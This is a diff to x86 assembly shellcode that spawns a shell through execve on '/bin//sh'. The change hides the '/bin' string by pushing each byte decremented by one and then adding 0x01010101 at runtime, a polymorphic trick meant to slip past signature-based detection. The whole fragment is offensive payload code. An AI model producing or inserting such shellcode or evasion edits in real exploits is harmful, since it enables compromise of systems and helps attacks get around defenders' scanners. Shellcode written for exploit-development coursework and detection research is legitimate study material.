@@ -21,7 +21,9 @@ repeat:
   inc eax                     ; increment eax till 0xb (polymorphic)
   loop repeat
 
-  push   0x68732f2f           ; "hs//"
-  push   0x6e69622f           ; "nib/"
-  mov    ebx,esp              ; Store pointer to string in ebx
-  int    0x80                 ; syscal execve
+  push 0x68732f2f             ; "hs//" 
+  push 0x6d68612e             ; "nib/" with each bytes -1
+  add dword [esp], 0x01010101 ; "nib/" add 1 to each bytes
+
+  mov ebx,esp                 ; Store pointer to string in ebx
+  int 0x80                    ; syscal execve
